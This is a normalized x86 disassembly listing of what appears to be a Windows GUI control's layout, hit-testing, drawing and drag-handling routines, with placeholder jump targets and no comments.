mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_417e94
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_417e94
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
mov eax [ ebx ]
call sub_43f550
mov eax [ esp + 0x8 ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1a ] eax
mov eax [ ebx + 0x4 ]
sub [ ebx + 0x16 ] eax
mov eax [ ebx + 0x8 ]
sub [ ebx + 0x1a ] eax
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1a ]
mov eax [ ebx + 0x30 ]
add edx [ eax + 0x24 ]
mov ecx esp
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x16 ]
call sub_416a38
mov eax [ esp ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1a ] eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
mov al [ ebx + 0x38 ]
mov [ ebx + 0x15 ] al
sub_42e228
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov [ esp + 0x4 ] 0x1
mov eax ebx
call sub_446754
test al al
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
call sub_4430fc
test eax eax
jle r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
mov [ ebp ] eax
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_43f5f8
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax [ esp ]
add [ eax ] edx
inc esi
xor edi edi
mov eax ebx
call sub_43f5b4
mov edx [ ebx + 0x48 ]
sub edx eax
add [ ebp ] edx
jmp r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_417e94
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax + 0x3d ]
mov ecx [ eax ]
add edx [ ecx + 0x4c ]
add edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov ecx [ esp ]
cmp edx [ ecx ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_417e94
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
cmp edx [ ebp ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax ] edx
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
mov [ ebp ] edx
sub_42e34c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x5 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x10 ]
mov edx [ edx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x15 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x1d ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_417e94
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
mov ecx ebx
call sub_417f10
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ eax + 0x34 ] ebx
mov edx [ ebp + 0x8 ]
add edx 0xffffffdf
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x19 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x21 ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x29 ]
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42cf9c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x15 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
dec [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x1d ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x20 ]
push eax
push ebx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x21 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42e4c8
mov [ ebx + 0x15 ] 0x0
mov [ ebx + 0x38 ] 0x0
sub_42e4c8
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x214 ] edx
mov eax [ ebp + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x0
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_417e94
mov [ ebp - 0x4d ] al
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_417d84
jmp r-xdata
mov [ ebp - 0xc ] 0xffffffff
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_417e94
mov [ ebp - 0xc ] eax
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_417d84
jmp r-xdata
mov eax [ ebp + 0x24 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
or ebx 0xffffffff
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_417e94
mov ebx eax
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_417d84
jmp r-xdata
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp + 0x10 ] eax
mov esi rw-data
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test ebx ebx
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x80000001
mov [ ebp - 0x44 ] 0x80000001
push esi
lea edi [ ebp - 0x21 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
add ebx [ ebp - 0x15 ]
sub ebx [ ebp - 0x1d ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov ebx [ ebp - 0x35 ]
add ebx [ ebp - 0x2d ]
push ebp
call sub_42e34c
pop ecx
inc eax
mov [ ebp - 0x54 ] eax
xor esi esi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x29 ] al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
shr eax 0x1
add eax [ ebp - 0x1d ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x234 ]
and al [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0xc ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp - 0x21 ]
cmp eax [ ebp - 0x64 ]
jle r-xdata
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x21 ]
add eax [ ebp + 0x10 ]
mov [ ebp - 0x19 ] eax
lea edx [ ebp - 0x39 ]
lea eax [ ebp - 0x21 ]
call sub_42d044
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp esi eax
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
add eax [ ebp - 0x1d ]
mov [ ebp - 0x15 ] eax
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebp + 0xc ] eax
inc [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
lea eax [ esi + 0x1 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x21 ]
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_417e94
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebx + 0x34 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
inc esi
dec [ ebp - 0x54 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x11 ] al
push ebp
call sub_42e34c
pop ecx
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov edx esi
call sub_417e94
mov ebx eax
mov eax [ ebx + 0x1a ]
add eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
mov edi [ ebx + 0x16 ]
mov ecx edi
add ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax edi
call sub_416a60
mov eax [ ebp - 0x58 ]
mov edx eax
sub edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x40 ]
jle r-xdata
mov [ ebp - 0x5 ] al
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42e7e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov [ ebx + 0x214 ] eax
mov eax [ ebx + 0x228 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
xor edi edi
inc edi
dec ebp
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_417e94
mov esi eax
mov eax [ esi ]
cmp eax [ esp ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x228 ]
call sub_42d01c
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp edi eax
jge r-xdata
lea edx [ edi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_417e94
mov [ eax + 0x15 ] 0x1
sub_42e864
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov [ esi ] 0x1
pop esi
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_42e8a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffec
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_421ef8
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
add edx 0x2
mov eax [ esi ]
call sub_42266c
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_42260c
mov ecx [ ebx + 0xc ]
inc ecx
mov edx [ ebx ]
mov eax [ esi ]
call sub_42260c
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_421ef8
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_42266c
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_42260c
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_42260c
pop esi
pop ebx
pop ebp
retn
sub_42e924
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov dl [ r-xdata ]
mov [ ebp - 0x15 ] dl
push esi
lea edx [ ebp - 0x15 ]
push edx
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0xd0 ]
test [ ebp - 0x15 ] 0x2
je r-xdata
test [ ebp - 0x15 ] 0x1
je r-xdata
push 0xf
push 0x4
push esi
mov eax [ ebp - 0x4 ]
call sub_4229f0
push eax
call DrawEdge
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
sub eax 0x3
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ebx [ esi ]
add ebx 0x3
mov ecx ebx
add ecx 0x2
mov edx [ esi + 0x4 ]
add edx 0x2
mov eax ebx
call sub_416a60
push ebp
call sub_42e8a0
pop ecx
sub_42e9a1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffe8
mov esi eax
cmp [ esi + 0x25a ] 0x0
je r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx esi
mov eax [ esi + 0x25c ]
call [ esi + 0x258 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0x4 ] eax
mov [ esp ] 0x0
inc [ esp ]
dec [ esp + 0x4 ]
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax [ esi + 0x228 ]
call sub_417e94
mov ebx eax
mov edi [ ebx ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax edi
call sub_43f550
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x8 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0xc ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x10 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x14 ] eax
lea eax [ esp + 0x8 ]
push eax
mov ecx edi
mov edx [ esi + 0x208 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xdc ]
cmp [ edi + 0x57 ] 0x0
je r-xdata
sub_42ea64
push ebx
push esi
push edi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
inc edi
mov [ esp + 0xc ] 0x0
inc [ esp + 0xc ]
dec edi
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x228 ]
mov edx [ esp + 0xc ]
call sub_417e94
mov [ esp + 0x8 ] eax
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x10 ]
mov eax [ ebx ]
call sub_43f550
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x10 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x18 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x1c ] eax
lea ecx [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_416a38
push [ esp + 0x24 ]
push [ esp + 0x24 ]
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_42eb24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_442c64
xor eax eax
push ebp
push sub_42eba3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
sub_42ebb2
add [ eax ] al
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445c28
cmp [ esi + 0x4 ] 0x11
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx [ ebx + 0x218 ]
mov eax ebx
call sub_42eef4
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov esi eax
push esp
call GetCursorPos
push 0x1
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_446450
push eax
push 0x0
call MapWindowPoints
mov eax [ esp + 0x4 ]
push eax
push 0x1
mov edx [ esi ]
mov ecx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42ec38
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x218 ] edx
mov eax [ esi ]
xor edx edx
mov [ eax + 0x214 ] edx
mov eax [ esi ]
xor edx edx
call sub_42eb24
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx ebx
call sub_417e94
call sub_4026fc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42ec9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
push esi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_4411ac
mov eax [ ebp - 0x4 ]
call sub_43fdd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebp
call sub_42ec38
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42ea64
mov ebx eax
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42eef4
mov ebx eax
jmp r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ edx + 0x218 ] eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x214 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x214 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebx + 0x3d ]
sub edx [ ebp + 0x8 ]
mov eax [ ebx + 0x39 ]
sub eax esi
call sub_416a38
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x21c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x220 ] edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov ecx esi
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
sub_42eda8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_441464
mov eax ebx
call sub_43fdd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx + 0x218 ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_42eef4
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x8 ]
add eax [ ebx + 0x21c ]
mov [ esi + 0x16 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebx + 0x220 ]
mov [ esi + 0x1a ] eax
mov eax [ esi + 0x16 ]
mov [ esi + 0x39 ] eax
mov eax [ esi + 0x1a ]
mov [ esi + 0x3d ] eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
add eax [ esi + 0x4 ]
add eax [ esi + 0xc ]
mov [ esi + 0x44 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esi ]
mov eax ebx
call sub_42eb24
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ esi ]
mov edi [ eax + 0x4c ]
mov eax edi
neg eax
cmp eax [ esi + 0x16 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ esi ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
mov eax edi
neg eax
cmp eax [ esi + 0x1a ]
jg r-xdata
mov eax ebx
call sub_43f5b4
add eax edi
cmp eax [ esi + 0x16 ]
jl r-xdata
mov eax ebx
call sub_43f5f8
add edi eax
cmp edi [ esi + 0x1a ]
jge r-xdata
sub_42ee9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44150c
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
mov [ esi + 0x218 ] edx
cmp eax [ esi + 0x214 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe0 ]
xor eax eax
mov [ esi + 0x214 ] eax
jmp r-xdata
sub_42eef4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp ebp [ eax ]
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_417e94
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_417e94
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42ef40
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x1 ] 0x1
test ebx ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ eax + 0x23a ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
call sub_440258
lea edx [ ebp - 0x1 ]
push edx
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_42ef8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax edi
call sub_444e30
cmp [ edi + 0x211 ] 0x0
